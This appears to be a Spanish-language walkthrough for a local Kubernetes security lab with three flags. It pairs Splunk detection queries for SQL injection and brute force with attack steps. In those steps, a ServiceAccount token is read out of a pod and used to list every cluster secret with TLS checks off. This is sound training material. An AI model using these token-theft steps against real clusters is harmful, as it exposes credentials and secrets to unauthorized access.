// Módulo 4 — Blue Team (Splunk) → Flag #3

-- Detección de SQL Injection
index=main sourcetype=access_combined
| rex field=uri "(?i)(?P<sqli>union|select|drop|or\s+')"
| where isnotnull(sqli)
| stats count by src_ip, sqli | sort -count

-- Detección de Brute Force
index=main sourcetype=access_combined status=401
| stats count by src_ip, uri
| where count > 20
| eval alert="BRUTE_FORCE_DETECTED"
| table src_ip, uri, count, alert

🚀 Arranque

# Requiere Kind + kubectl
bash lab04/setup-k8s.sh
# o
make lab04

☸️ Acceso al cluster

kubectl get pods -A \
  --context kind-lab-expert

kubectl port-forward \
  svc/vulnerable-api 8282:80 \
  -n lab-expert \
  --context kind-lab-expert

// Flag #1 — RBAC Misconfiguration

# El ServiceAccount tiene ClusterAdmin — enumerarlo
kubectl auth can-i --list \
  --as=system:serviceaccount:lab-expert:lab-overprivileged-sa \
  --context kind-lab-expert

# Extraer token desde el pod
TOKEN=$(kubectl exec -n lab-expert deploy/vulnerable-api \
  --context kind-lab-expert -- \
  cat /var/run/secrets/kubernetes.io/serviceaccount/token)

# Usar token para listar secrets del cluster
kubectl get secrets -A \
  --token="$TOKEN" \
  --server=https://$(kubectl get svc kubernetes \
    -o jsonpath='{.spec.clusterIP}'):443 \
  --insecure-skip-tls-verify

// Flag #2 — API vuln endpoint

# Port-forward al servicio
kubectl port-forward svc/vulnerable-api 8282:80 \
  -n lab-expert --context kind-lab-expert &

# Acceder al endpoint de flag
curl http://localhost:8282/flag

// Flag #3 — Blue Team con Falco

# Ver alertas Falco en tiempo real
kubectl logs -l app=falco -n lab-expert \
  --context kind-lab-expert -f | grep "ALERT"
